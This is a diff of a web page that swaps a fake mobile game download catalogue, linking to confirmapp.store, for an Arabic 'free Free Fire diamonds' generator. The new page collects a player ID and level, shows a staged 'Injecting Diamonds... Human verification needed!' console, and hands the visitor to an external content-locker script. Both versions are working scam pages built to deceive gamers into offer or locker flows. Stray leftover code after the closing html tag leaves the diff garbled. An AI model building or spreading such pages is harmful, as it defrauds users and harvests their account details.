@@ -1,107 +1,210 @@
-<!doctype html>
-<html lang="en">
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Apkmet.fun - Games</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-  <style>
-  :root { --bg:#0b0b0f; --card:#14141a; --muted:#a1a1aa; --primary:#22c55e; --ios:#0a84ff; }
-  * { box-sizing: border-box; }
-  body { margin:0; font-family: Inter, Arial, sans-serif; background:var(--bg); color:#fff; }
-  header, footer { text-align:center; padding:16px 20px; }
-  header h1 { margin:8px 0 0; font-size:18px; color:#e5e7eb; letter-spacing:.4px; }
-  .wrap { max-width: 1200px; margin: 24px auto; padding: 0 16px; }
-  .grid { display:grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap:16px; }
-  .card { background:var(--card); border-radius:14px; padding:12px; text-decoration:none; color:#fff; box-shadow:0 10px 30px rgba(0,0,0,.35); transition: transform .15s ease; display:block; text-align:center; }
-  .card:hover { transform: translateY(-3px); }
-  .card img { width:120px; height:120px; object-fit:cover; border-radius:10px; margin:auto; display:block; }
-  .card h3 { margin:10px 0 4px; font-size:14px; }
-  .card .version { font-size:11px; color:var(--muted); margin:4px 0; }
-  .card .stars { font-size:12px; color:#fbbf24; margin:2px 0; }
-  .half-star { display: inline-block; position: relative; width: 1em; }
-  .half-star::before { content: '★'; position: absolute; left: 0; width: 50%; overflow: hidden; color: #fbbf24; }
-  .half-star::after { content: '★'; color: #666; }
-  footer { color:#a1a1aa; font-size:13px; }
-  .card-detail { background:var(--card); border-radius:16px; padding:24px; box-shadow: 0 10px 30px rgba(0,0,0,.35); }
-  .hero { display:flex; gap:24px; align-items:center; flex-wrap:wrap; }
-  .hero img { width:160px; height:160px; object-fit:cover; border-radius:16px; }
-  .title { font-size:24px; font-weight:700; margin:0 0 8px; }
-  .muted { color:var(--muted); margin:0; }
-  .btns { display:flex; gap:12px; margin-top:20px; flex-wrap:wrap; }
-  .btn { padding:14px 20px; border-radius:12px; font-weight:700; text-decoration:none; color:#fff; display:inline-flex; align-items:center; gap:10px; border:0; cursor:pointer; }
-  .btn-android { background:var(--primary); }
-  .btn-ios { background:var(--ios); }
-  .notice { margin-top:16px; color:#cbd5e1; font-size:14px; }
-  .back a { color:#93c5fd; text-decoration:none; }
+  <script type="text/javascript">
+var sc_project=13206088; 
+var sc_invisible=1; 
+var sc_security="cb6f73f3"; 
+</script>
+<script type="text/javascript" src="https://www.statcounter.com/counter/counter.js" async></script>
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-WQ0798RDQ2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-WQ0798RDQ2');
+</script>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>💎💎</title>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+
+<style>
+:root { --primary:#ffcc00; --red:#e41e26; --dark-text:#1e293b; }
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
+body{
+background:#ffffff;
+color:var(--dark-text);
+font-family:'Cairo',sans-serif;
+margin:0;
+display:flex;
+flex-direction:column;
+align-items:center;
+justify-content:center;
+min-height:100vh;
+}
+.main-container{
+width:92%;
+max-width:420px;
+background:#ffffff;
+border-radius:20px;
+padding:25px;
+border:3px solid var(--primary);
+box-shadow:0 10px 30px rgba(0,0,0,0.1);
+text-align:center;
+}
+.game-title{font-weight:900;font-size:1.8rem;color:var(--red);margin-bottom:20px;}
+.step-card{display:none;flex-direction:column;align-items:center;}
+.step-card.active{display:flex;}
+h2{font-size:1.3rem;margin-bottom:20px;color:var(--dark-text);}
+.input-box{
+width:100%;
+padding:15px;
+border-radius:10px;
+border:2px solid #e2e8f0;
+background:#f8fafc;
+color:#000;
+font-size:18px;
+margin-bottom:10px;
+text-align:center;
+outline:none;
+}
+.btn-red{
+background:var(--red);
+color:#fff;
+border:none;
+padding:15px;
+width:100%;
+border-radius:10px;
+font-weight:700;
+font-size:18px;
+cursor:pointer;
+box-shadow:0 4px 0 #991b1b;
+margin-top:10px;
+}
+.gem-item{
+width:100%;
+background:#1e293b;
+padding:12px 15px;
+border-radius:12px;
+margin-bottom:10px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+border:1px solid #334155;
+cursor:pointer;
+color:#fff;
+}
+.gem-info{display:flex;align-items:center;gap:10px;font-weight:bold;font-size:1.1rem;}
+.gem-tag{background:var(--primary);color:#000;padding:4px 12px;border-radius:5px;font-size:13px;font-weight:900;}
+.console{
+background:#000;
+color:#22c55e;
+font-family:monospace;
+padding:10px;
+border-radius:8px;
+font-size:12px;
+text-align:left;
+direction:ltr;
+width:100%;
+height:100px;
+overflow-y:auto;
+margin:15px 0;
+}
+.final-msg{
+color:#15803d;
+font-weight:bold;
+line-height:1.6;
+margin-bottom:15px;
+background:#f0fdf4;
+padding:10px;
+border-radius:8px;
+border:1px solid #bcf0da;
+}
+.error{color:#ff4b2b;font-size:13px;margin-bottom:10px;display:none;font-weight:bold;}
 </style>
-  <link rel="me" href="https://www.blogger.com/profile/17722694764173895217">
-  <meta name="google-adsense-platform-account" content="ca-host-pub-1556223355139109">
-  <meta name="google-adsense-platform-domain" content="blogspot.com">
 </head>
+
 <body>
-  <header>
-    <img src="https://i.ibb.co/gbsY945Q/Black-and-Green-Illustrative-E-Sports-Gaming-Logo-2-removebg.png" alt="Apkmet.fun" height="40">
-    <h1>Apkmet.fun — Games</h1>
-  </header>
-  <div class="wrap" id="main"></div>
-  <footer>© 2025 Apkmet.fun — All rights reserved</footer>
 
-  <script>
-// الرابط الجديد الخاص بك
-const downloadURL = "https://confirmapp.store/fl/r6y87";
+<div class="main-container">
+<div class="game-title">FREE FIRE</div>
 
-const GAMES = [
-  {"id": "GTA5Mobile", "title": "GTA 5 Mobile", "image": "https://www5.0zz0.com/2023/10/15/08/332140079.jpeg", "version": "v1.0.3095/1.68", "stars": "★★★★☆"},
-  {"id": "GTAViceCity", "title": "GTA Vice City", "image": "https://i.postimg.cc/gjzQQ2sb/1680953248-gtavc.png", "version": "v3.9.6", "stars": "★★★★☆"},
-  {"id": "AssettoCorsaMobile", "title": "Assetto Corsa Mobile", "image": "https://i.postimg.cc/3xHVQWW0/Picsart-25-02-25-00-54-38-367-1.jpg", "version": "v1.16.4", "stars": "★★★★★"},
-  {"id": "BeamNGdriveMobile", "title": "BeamNG.drive Mobile", "image": "https://i.postimg.cc/k5skc9J6/Picsart-25-03-08-05-57-01-681.jpg", "version": "v0.32.0.0", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "EuroTruckSimulator2", "title": "Euro Truck Simulator 2", "image": "https://i.postimg.cc/kXfCsxTX/32aee5919f1c4e81da58627d21b3323a.jpg", "version": "v1.0.0", "stars": "★★★★☆"},
-  {"id": "ForzaHorizon5", "title": "Forza Horizon 5", "image": "https://sm.ign.com/ign_nordic/cover/f/forza-hori/forza-horizon-5_5jjv.jpg", "version": "v1.656.386.0", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "the crew motorfest mobile", "title": "the crew motorfest mobile", "image": "https://i.postimg.cc/RVnTsbH8/the-crew-motorfest-download-The-Crew-Motor-Fest-1.avif", "version": "v2.4.1", "stars": "★★★★☆"},
-  {"id": "SPIKE MOD", "title": "SPIKE MOD", "image": "https://i.postimg.cc/wTsTgDV0/5776411510962851093.jpg", "version": "v2.4.1", "stars": "★★★★☆"},
-  {"id": "Battlefield 6 Mobile", "title": "Battlefield 6 Mobile", "image": "https://i.postimg.cc/QMvBkhJ8/battlefield-6-mobile-300x300.webp", "version": "v2.4.1", "stars": "★★★★☆"},
-  {"id": "Hollow Knight: Silksong", "title": "Hollow Knight: Silksong", "image": "https://i.postimg.cc/Mpm2MDqF/Fr-Mkduml-Mozlmzk-APFqq-D1y-Gwo-OJ.webp", "version": "v1.8.2", "stars": "★★★★★"},
-  {"id": "Baseball9Mod", "title": "Baseball 9 Mod", "image": "https://i.postimg.cc/MpM7RJ8R/baseball9mod.jpg", "version": "v2.3.4", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "CarXDriftRacing2MODPACK", "title": "CarX Drift Racing 2 MOD PACK", "image": "https://i.postimg.cc/XJxx1y6b/CARX-DRIFT-RACING-2-LOGO-VS-MODS.png", "version": "v4.21.0", "stars": "★★★★☆"},
-  {"id": "RedDeadRedemption2Mobile", "title": "Red Dead Redemption 2 Mobile", "image": "https://i.postimg.cc/jqkbzjTB/rdr2.jpg", "version": "v1.5.2", "stars": "★★★★★"},
-  {"id": "FC24Mobile", "title": "FC 24 Mobile", "image": "https://image.api.playstation.com/vulcan/ap/rnd/202310/0214/c21c0669eaca7f3e02c41cad5e1a20f867aafcf14104f046.png", "version": "v17.2.01", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "NarutoUltimateNinjaStormMobile", "title": "NARUTO: Ultimate Ninja STORM Mobile", "image": "https://i.postimg.cc/4NwpbNjR/nr.png", "version": "v3.7.1", "stars": "★★★★☆"},
-  {"id": "FiveNightsatFreddys", "title": "Five Nights at Freddy's", "image": "https://i.postimg.cc/k5skc9J6/Picsart-25-03-08-05-57-01-681.jpg", "version": "v2.0.8", "stars": "★★★★★"},
-  {"id": "Rematch", "title": "Rematch", "image": "https://i.postimg.cc/MKrxqfKR/images-8.jpg", "version": "v1.3.5", "stars": "★★★★☆"},
-  {"id": "Once Human mobile", "title": "Once Human mobile", "image": "https://i.postimg.cc/sXrW0ht0/434x0w.webp", "version": "v1.2.7", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "TheLastofUsmobile", "title": "The Last of Us mobile", "image": "https://i.postimg.cc/FzDg1pVj/tlouicon.png", "version": "v2.1.4", "stars": "★★★★★"},
-  {"id": "SPIDERMANMOBILE", "title": "SPIDERMAN MOBILE", "image": "https://upload.wikimedia.org/wikipedia/en/a/aa/Spider-Man_Unlimited.png", "version": "v4.5.2", "stars": "★★★★☆"},
-  {"id": "HitmanSniper", "title": "Hitman Sniper", "image": "https://i.postimg.cc/k5skc9J6/Picsart-25-03-08-05-57-01-681.jpg", "version": "v1.9.3", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "GRANTURISM07", "title": "GRAN TURISM 07", "image": "https://image.api.playstation.com/vulcan/ap/rnd/202109/1321/yZ7dpmjtHr1olhutHT57IFRh.png", "version": "v7.2.1", "stars": "★★★★★"},
-  {"id": "Efootball2024", "title": "Efootball 2024", "image": "https://www.konami.com/img/common/sp_js_img/main_sp_kde_efootball2024_0908.jpg", "version": "v3.8.0", "stars": "★★★★☆"},
-  {"id": "SnowRunner", "title": "SnowRunner", "image": "https://i.postimg.cc/C52bdZfM/snow.jpg", "version": "v1.6.4", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "GTASANANDREAS", "title": "GTA SAN ANDREAS", "image": "https://i.postimg.cc/nLw1pcnt/unnamed.webp", "version": "v2.0.0", "stars": "★★★★☆"},
-  {"id": "DreamLeagueSoccerModApk", "title": "Dream League Soccer Mod Apk", "image": "https://m.media-amazon.com/images/I/41GZrXhv0BL.jpg", "version": "v11.07", "stars": "★★★★★"},
-  {"id": "RidersRepublic", "title": "Riders Republic", "image": "https://image.api.playstation.com/vulcan/img/rnd/202112/2100/7eEv1gTTKw9GA5OWi00yyT3s.png", "version": "v1.8.2", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "NBA2K23MOBILE", "title": "NBA2K23 MOBILE", "image": "https://assets.2k.com/1a6ngf98576c/4oCqsi6G8MfDjHKhjhBtrP/d43164117e00d78c0cf85dfafeb3b906/NBA23-WEBSITE-ATHLETE_HUB-MODULE1-STD_THUMBNAIL-828x828.jpg", "version": "v124.0.1", "stars": "★★★★☆"},
-  {"id": "ProSoccerOnline", "title": "Pro Soccer Online", "image": "https://www.mandatory.gg/wp-content/uploads/mandatory-zlan-2022-pro-soccer-online-meta.png", "version": "v2.5.1", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "MINECRAFT", "title": "MINECRAFT", "image": "https://preview.redd.it/avjal33hpqo61.png?width=512&format=png&auto=webp&s=b652d83347448df74c8ba61c17b322e686ee32a4", "version": "v1.20.1", "stars": "★★★★★"},
-  {"id": "FarmingSimulator23", "title": "Farming Simulator 23", "image": "https://assets-prd.ignimgs.com/2023/05/01/farmingsim23-1682967114647.jpg", "version": "v1.4.2", "stars": "★★★★☆"},
-  {"id": "AvatarWorldModApk", "title": "Avatar World Mod Apk", "image": "https://i.postimg.cc/brjhdg3p/1755341108-1.webp", "version": "v1.9.7", "stars": "★★★★<span class='half-star'></span>"},
-  {"id": "PS3EmulatorMobile", "title": "PS3 Emulator Mobile", "image": "https://i.postimg.cc/Y9GBqZ7v/ps3emulator.jpg", "version": "v3.2.8", "stars": "★★★★☆"},
-  {"id": "VeryLittleNightmares", "title": "Very Little Nightmares", "image": "https://apkvision.org/wp-content/uploads/2020/01/Very-Little-Nightmares-2-140x140.png", "version": "v1.5.3", "stars": "★★★★★"},
-  {"id": "PoppyPlaytimeMobile", "title": "Poppy Playtime Mobile", "image": "https://cdn.now.gg/apps-content/com.MOBGames.PoppyMobileChap1/icon/poppy-playtime.png", "version": "v2.1.6", "stars": "★★★★<span class='half-star'></span>"}
-];
+<div id="step1" class="step-card active">
+<h2>تسجيل الدخول بمعرف اللاعب</h2>
+<input type="text" id="p-id" class="input-box" placeholder="معرف اللاعب (ID)" inputmode="numeric">
+<p id="err" class="error">⚠️ خطأ يرجى إدخال ID صحيح</p>
+<button class="btn-red" onclick="valID()">تسجيل الدخول</button>
+</div>
 
-function getId() {
-  const q = new URLSearchParams(location.search);
-  return q.get("id") || "";
+<div id="step2" class="step-card">
+<h2>ما هو مستواك في اللعبة؟</h2>
+<input type="text" id="p-lvl" class="input-box" placeholder="Account Level" inputmode="numeric">
+<button class="btn-red" onclick="move(3)">تأكيد المستوى</button>
+</div>
+
+<div id="step3" class="step-card">
+<h2>اختر كمية الجواهر</h2>
+<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 100+10</div><div class="gem-tag">استلام</div></div>
+<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 210+20</div><div class="gem-tag">استلام</div></div>
+<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 530+31</div><div class="gem-tag">استلام</div></div>
+<div class="gem-item" onclick="move(4)"><div class="gem-info">💎 1080+100</div><div class="gem-tag">استلام</div></div>
+</div>
+
+<div id="step4" class="step-card">
+<h2 id="wait-text">جاري معالجة البيانات...</h2>
+<div class="console" id="log"></div>
+
+<div id="fin" style="display:none;">
+<p class="final-msg">✅ تم التحقق من الحساب: <span id="res-id" style="color:#000"></span> بنجاح. أكمل الخطوة الأخيرة لإرسال الجواهر.</p>
+<button class="btn-red" style="background:var(--primary);color:#000;box-shadow:0 4px 0 #b79500;" onclick="final()">اضغط للتحقق الأخير</button>
+</div>
+</div>
+</div>
+
+<script>
+let playerID="";
+
+function valID(){
+const input=document.getElementById('p-id').value;
+// تحديث الشرط ليكون من 9 إلى 12 رقم
+if(/^\d{9,12}$/.test(input)){
+playerID=input;
+document.getElementById('err').style.display='none';
+move(2);
+}else{
+document.getElementById('err').style.display='block';
+}
 }
 
-function renderList() {
-  const grid = document.createElement("div");
-  grid.className = "grid";
-  GAMES.forEach(g => {
-    const a = document.createElement("a");
-    a.className = "card";
-    a.href = "?id=" + g.id;
-    let cardContent = `<img src="${g.image}" alt="${g.title}"><h3>${g.title}</h3>`;
+function move(s){
+document.querySelectorAll('.step-card').forEach(c=>c.classList.remove('active'));
+document.getElementById('step'+s).classList.add('active');
+if(s===4)runLog();
+}
+
+function runLog(){
+const log=document.getElementById('log');
+const lines=["> Connecting...","> ID: "+playerID+" Found","> Checking Account Level...","> Injecting Diamonds...","> Human verification needed!"];
+let i=0;
+let itv=setInterval(()=>{
+log.innerHTML+=`<div>${lines[i]}</div>`;
+log.scrollTop=log.scrollHeight;
+i++;
+if(i>=lines.length){
+clearInterval(itv);
+document.getElementById('res-id').innerText=playerID;
+document.getElementById('fin').style.display='block';
+document.getElementById('wait-text').innerText="اكتمل الفحص!";
+}
+},1000);
+}
+
+function final(){
+if(typeof _Vm==='function'){ _Vm(); }
+else{ alert("لم يتم تحميل قفل المحتوى بعد"); }
+}
+</script>
+
+<script type="text/javascript">
+var UhZbL_Yle_eueSZc={"it":4591300,"key":"b4b85"};
+</script>
+<script src="https://duw03nk63ml3f.cloudfront.net/7ebc02a.js"></script>
+
+</body>
+</html>    let cardContent = `<img src="${g.image}" alt="${g.title}"><h3>${g.title}</h3>`;
     if (g.version) cardContent += `<div class="version">${g.version}</div>`;
     if (g.stars) cardContent += `<div class="stars">${g.stars}</div>`;
     a.innerHTML = cardContent;
